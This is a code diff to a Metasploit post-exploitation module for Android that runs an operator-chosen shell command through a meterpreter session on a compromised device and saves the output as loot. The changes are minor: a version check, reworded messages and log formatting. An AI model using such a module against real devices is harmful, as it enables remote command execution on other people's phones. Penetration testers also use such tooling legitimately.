@@ -71,6 +71,7 @@ class MetasploitModule < Msf::Post
       Rank = ExcellentRanking
 
   include Msf::Post::File
+  include Msf::Post::Android::System
 
 
 
@@ -90,8 +91,8 @@ class MetasploitModule < Msf::Post
                                         'Module Author: r00t-3xp10it', # post-module author :D
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
-                        'DisclosureDate' => '21 jun 2018',
+                        'Version'        => '$Revision: 1.2',
+                        'DisclosureDate' => '22 jun 2018',
                         'Platform'       => 'android',
                         'Arch'           => ARCH_DALVIK,
                         'Privileged'     => 'false',  # root privileges required?
@@ -140,6 +141,7 @@ def run
   runtor = client.sys.config.getuid
   runsession = client.session_host
   directory = client.fs.dir.pwd
+  build_prop = get_build_prop # android version release
   #
   # draw module banner ..
   #
@@ -162,15 +164,15 @@ def run
     # to prevent 'unset all' from deleting default options ..
     #
     if datastore['EXEC_COMMAND'] == 'nil'
-      print_error("Options not configurated correctly ..")
+      print_error("[ABORT]: Options not configurated correctly!")
       print_warning("Please set EXEC_COMMAND <command>")
       return nil
     end
     #
-    # Check for proper target operative system (Linux)
+    # Check for proper target operative system (Android)
     #
     unless sysinfo['OS'] =~ /Android/ || sysinfo['OS'] =~ /android/
-      print_error("[ABORT]: This module only works againts Android systems")
+      print_error("[ABORT]: This module only works againts Android systems!")
       return nil
     end
     #
@@ -178,7 +180,8 @@ def run
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
     #
     if not sysinfo.nil?
-      print_good("Running module against: #{runsession}")
+      android_version = Gem::Version.new(build_prop['ro.build.version.release'])
+      print_status("Running module against: android #{android_version}")
       Rex::sleep(0.5)
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
@@ -187,12 +190,12 @@ def run
 
       #
       # Single_command to execute remotely (user inputs) ..
-      # if sellected previous in option (set EXEC_COMMAND <command>) ..
+      # Example: set EXEC_COMMAND <command>
       #
       exec_comm = datastore['EXEC_COMMAND']
-        # check if single_command option its configurated ..
+        # check if exec_command option its configurated ..
         if not exec_comm.nil?
-          print_status("Executing: #{exec_comm}")
+          print_good("Executing: #{exec_comm}")
           Rex::sleep(0.5)
           # bash command to be executed remotely ..
           single_comm = cmd_exec("#{exec_comm}")
@@ -200,10 +203,13 @@ def run
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
+            data_dump << "************************************\n"
             data_dump << "Executing: #{exec_comm}\n"
+            data_dump << "************************************\n"
             data_dump << single_comm
             data_dump << "\n\n"
             # print data on screen
+            print_line("")
             print_line(single_comm)
             print_line("")
             Rex::sleep(0.2)
@@ -211,7 +217,7 @@ def run
 
       #
       # Store (data_dump) contents into msf loot folder? (local) ..
-      # IF sellected previous in advanced options (set STORE_LOOT true) ..
+      # IF sellected previous the option (set STORE_LOOT true)
       #
       if datastore['STORE_LOOT'] == true
         print_good("Session logfile stored in: ~/.msf4/loot folder")
